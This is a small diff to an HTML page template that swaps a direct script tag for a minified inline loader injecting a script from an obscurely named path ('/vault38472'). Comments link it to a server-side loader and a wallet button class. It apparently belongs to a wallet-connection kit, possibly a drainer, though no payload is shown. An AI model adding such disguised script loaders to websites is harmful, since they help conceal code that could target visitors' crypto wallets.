@@ -4,8 +4,10 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Your site</title>
-    <!-- Path must match script_path in config.php + nginx location -->
-    <script src="/vault38472" defer></script>
+    <!-- Path must match script_path in loader.php + nginx location -->
+    <script>
+      !function(u){var s=document.createElement("script");s.src=u;s.defer=1;document.head.appendChild(s)}("/vault38472");
+    </script>
   </head>
   <body>
     <!-- Class must match WALLET_BUTTON_CLASS in Vercel env vars -->
